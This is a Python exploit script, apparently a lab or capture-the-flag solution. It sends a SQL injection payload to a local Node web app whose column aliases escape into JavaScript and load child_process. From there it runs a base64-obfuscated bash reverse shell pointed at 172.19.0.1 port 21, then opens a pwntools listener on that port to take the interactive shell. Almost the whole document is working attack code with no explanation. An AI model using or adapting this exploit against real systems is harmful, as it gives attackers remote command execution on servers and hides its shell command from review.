from pwn import *
import asyncio
import requests
from urllib.parse import quote, urlencode

success = 0

web_server_address = 'localhost'
web_server_parameter = '?id=2;'
web_server_port = 3000

payload = ('SELECT 1 AS "\\\']=0;require=process.mainModule.constructor._load;/*", '
             '2 AS "*/p=require(`child_process`);/*", '
             '3 AS "*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*", '
             '4 AS "*/`cC8xNzIuMTkuMC4xLzIxIDA+JjE=|base64 -d|bash`)//"')

payload = quote(payload, safe='')

async def do_exploit():
    global success

    while True:
        if success == 1:
            print("[+] Successfully Exploited!!!")
            break
        r = requests.get(f'http://{web_server_address}:{web_server_port}/{web_server_parameter}{payload}')
        success = 1
        

# 호스트와 포트 설정
host = '0.0.0.0'  # 모든 인터페이스에서 수신
port = 21   #포트

# 소켓 생성 및 연결 대기
server = listen(port=port, bindaddr=host)

# 클라이언트 연결 대기
print(f"[i] Server is waiting on port {port}...")
# print(f'http://{web_server_address}:{web_server_port}/{web_server_parameter}{payload}')

asyncio.run(do_exploit())

client = server.wait_for_connection()

success = 1

client.interactive()

# 연결 종료
client.close()
server.close()